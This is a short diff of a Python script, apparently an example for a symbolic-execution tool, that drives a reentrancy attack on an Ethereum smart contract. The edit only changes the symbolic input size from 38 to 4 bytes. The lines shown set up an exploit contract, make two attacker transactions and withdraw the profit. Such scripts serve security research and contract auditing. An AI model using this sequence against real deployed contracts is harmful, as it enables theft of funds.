@@ -111,14 +111,14 @@ print "\t Setting 30 reply reps"
 exploit_account.set_reentry_reps(30)
 
 print "\t Setting reply string"
-exploit_account.set_reentry_attack_string(seth.SByte(38))
+exploit_account.set_reentry_attack_string(seth.SByte(4))
 
 #Attacker is
 print "[+] Attacker first transaction"
-exploit_account.delegate(seth.SByte(38), value=seth.SValue)
+exploit_account.delegate(seth.SByte(4), value=seth.SValue)
 
 print "[+] Attacker second transaction" 
-exploit_account.delegate(seth.SByte(38))
+exploit_account.delegate(seth.SByte(4))
 
 print "[+] The attacker destroys the exploit contract and profit" 
 exploit_account.get_money()
